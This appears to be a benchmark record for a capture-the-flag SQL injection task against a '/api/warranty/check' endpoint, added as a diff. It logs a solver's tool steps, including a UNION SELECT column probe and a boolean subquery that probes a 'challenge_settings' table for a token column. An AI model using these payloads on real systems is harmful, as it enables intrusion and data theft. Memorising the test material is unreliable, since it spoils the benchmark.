@@ -1,0 +1,77 @@
+name: benchmark:sql-injection-golden
+category: web
+keywords:
+- benchmark
+- sql
+- injection
+- golden
+- sql_injection
+- case
+steps:
+- '{"endpoint": "/api/warranty/check", "endpoint_key": "POST:/api/warranty/check:",
+  "method": "POST", "request_count": 1, "status_code": 200, "success": true, "tool":
+  "http_request"}'
+- '{"endpoint": "python", "error": "", "exit_code": 0, "method": "SCRIPT", "request_count":
+  1, "script_count": 1, "stderr_head": "", "stdout_head": "''Sales'' 200 {\"matched\":false,\"message\":\"\\u67e5\\u8be2\\u6761\\u4ef6\\u65e0\\u6548\"}",
+  "success": true, "timed_out": false, "tool": "python_run"}'
+- '{"endpoint": "python", "error": "", "exit_code": 0, "method": "SCRIPT", "request_count":
+  1, "script_count": 2, "stderr_head": "", "stdout_head": "true True", "success":
+  true, "timed_out": false, "tool": "python_run"}'
+- '{"endpoint": "python", "error": "", "exit_code": 0, "method": "SCRIPT", "request_count":
+  1, "script_count": 3, "stderr_head": "", "stdout_head": "is_cols True", "success":
+  true, "timed_out": false, "tool": "python_run"}'
+- '{"endpoint": "python", "error": "", "exit_code": 0, "method": "SCRIPT", "request_count":
+  1, "script_count": 4, "stderr_head": "", "stdout_head": "column count 3", "success":
+  true, "timed_out": false, "tool": "python_run"}'
+- '{"endpoint": "python", "error": "", "exit_code": 0, "method": "SCRIPT", "request_count":
+  1, "script_count": 5, "stderr_head": "", "stdout_head": "row exists True", "success":
+  true, "timed_out": false, "tool": "python_run"}'
+- '{"endpoint":"/api/warranty/check","evidence_refs":["bcebdfba-457b-5f8b-881c-b65d38f98329"],"request_count":1,"source_fact_seq":1,"status_code":200,"success":true,"tool":"http_request"}'
+- '{"evidence_refs":["bcebdfba-457b-5f8b-881c-b65d38f98329"],"request_count":1,"source_fact_seq":2,"success":true,"tool":"python_run"}'
+- '{"evidence_refs":["bcebdfba-457b-5f8b-881c-b65d38f98329"],"request_count":1,"source_fact_seq":3,"success":true,"tool":"python_run"}'
+- '{"evidence_refs":["bcebdfba-457b-5f8b-881c-b65d38f98329"],"request_count":1,"source_fact_seq":4,"success":true,"tool":"python_run"}'
+- '{"evidence_refs":["bcebdfba-457b-5f8b-881c-b65d38f98329"],"request_count":1,"source_fact_seq":5,"success":true,"tool":"python_run"}'
+- '{"evidence_refs":["bcebdfba-457b-5f8b-881c-b65d38f98329"],"request_count":1,"source_fact_seq":6,"success":true,"tool":"python_run"}'
+evidence_chain:
+- '{"endpoint": "/api/warranty/check", "endpoint_key": "POST:/api/warranty/check:",
+  "method": "POST", "request_count": 1, "status_code": 200, "success": true, "tool":
+  "http_request"}'
+- '{"endpoint": "python", "error": "", "exit_code": 0, "method": "SCRIPT", "request_count":
+  1, "script_count": 1, "stderr_head": "", "stdout_head": "''Sales'' 200 {\"matched\":false,\"message\":\"\\u67e5\\u8be2\\u6761\\u4ef6\\u65e0\\u6548\"}",
+  "success": true, "timed_out": false, "tool": "python_run"}'
+- '{"endpoint": "python", "error": "", "exit_code": 0, "method": "SCRIPT", "request_count":
+  1, "script_count": 2, "stderr_head": "", "stdout_head": "true True", "success":
+  true, "timed_out": false, "tool": "python_run"}'
+- '{"endpoint": "python", "error": "", "exit_code": 0, "method": "SCRIPT", "request_count":
+  1, "script_count": 3, "stderr_head": "", "stdout_head": "is_cols True", "success":
+  true, "timed_out": false, "tool": "python_run"}'
+- '{"endpoint": "python", "error": "", "exit_code": 0, "method": "SCRIPT", "request_count":
+  1, "script_count": 4, "stderr_head": "", "stdout_head": "column count 3", "success":
+  true, "timed_out": false, "tool": "python_run"}'
+- '{"endpoint": "python", "error": "", "exit_code": 0, "method": "SCRIPT", "request_count":
+  1, "script_count": 5, "stderr_head": "", "stdout_head": "row exists True", "success":
+  true, "timed_out": false, "tool": "python_run"}'
+- '{"endpoint": "python", "error": "", "exit_code": 0, "method": "SCRIPT", "request_count":
+  0, "script_count": 1, "stderr_head": "", "stdout_head": "baseline: (200, ''{\"matched\":false,\"message\":\"\\\\u67e5\\\\u8be2\\\\u6761\\\\u4ef6\\\\u65e0\\\\u6548\"}\\n'')",
+  "success": true, "timed_out": false, "tool": "python_run"}'
+- '{"endpoint": "python", "error": "", "exit_code": 0, "method": "SCRIPT", "request_count":
+  0, "script_count": 2, "stderr_head": "", "stdout_head": "union_nums | '' UNION SELECT
+  1,2,3-- - | (200, ''{\"matched\":false,\"message\":\"\\\\u67e5\\\\u8be2\\\\u6761\\\\u4ef6\\\\u65e0\\\\u6548\"}'')",
+  "success": true, "timed_out": false, "tool": "python_run"}'
+- '{"endpoint": "python", "error": "", "exit_code": 0, "method": "SCRIPT", "request_count":
+  0, "script_count": 3, "stderr_head": "", "stdout_head": "table_exists | (200, ''{\"matched\":true,\"message\":\"\\\\u5b58\\\\u5728\\\\u7b26\\\\u5408\\\\u6761\\\\u4ef6\\\\u7684\\\\u4fdd\\\\u4fee\\\\u8bb0\\\\u5f55\"}'')",
+  "success": true, "timed_out": false, "tool": "python_run"}'
+- '{"endpoint": "python", "error": "", "exit_code": 0, "method": "SCRIPT", "request_count":
+  0, "script_count": 4, "stderr_head": "", "stdout_head": "db_name | (200, ''{\"matched\":true,\"message\":\"\\\\u5b58\\\\u5728\\\\u7b26\\\\u5408\\\\u6761\\\\u4ef6\\\\u7684\\\\u4fdd\\\\u4fee\\\\u8bb0\\\\u5f55\"}'',
+  {''Server'': ''gunicorn'', ''Date'': ''Mon, 19 Oct 2026 02:31", "success": true,
+  "timed_out": false, "tool": "python_run"}'
+- '{"endpoint": "python", "error": "", "exit_code": 0, "method": "SCRIPT", "request_count":
+  0, "script_count": 5, "stderr_head": "", "stdout_head": "lit_vt | (200, ''{\"matched\":true,\"message\":\"\\\\u5b58\\\\u5728\\\\u7b26\\\\u5408\\\\u6761\\\\u4ef6\\\\u7684\\\\'')",
+  "success": true, "timed_out": false, "tool": "python_run"}'
+- '{"endpoint": "python", "error": "", "exit_code": 0, "method": "SCRIPT", "request_count":
+  0, "script_count": 6, "stderr_head": "", "stdout_head": "col_exists_A | '' OR (SELECT
+  COUNT(*) FROM challenge_settings WHERE verification_token IS NULL OR verification_token
+  IS NOT NULL)-- - | (''F'', 200)", "success": true, "timed_out": false, "tool": "python_run"}'
+success_format: flag\{[^}]+\}
+source: 1930e021-722b-449d-800b-b2f9b4dd30ed (solver 9e095f0c-91d8-46c4-bc69-e059c247755b)
+notes: ''
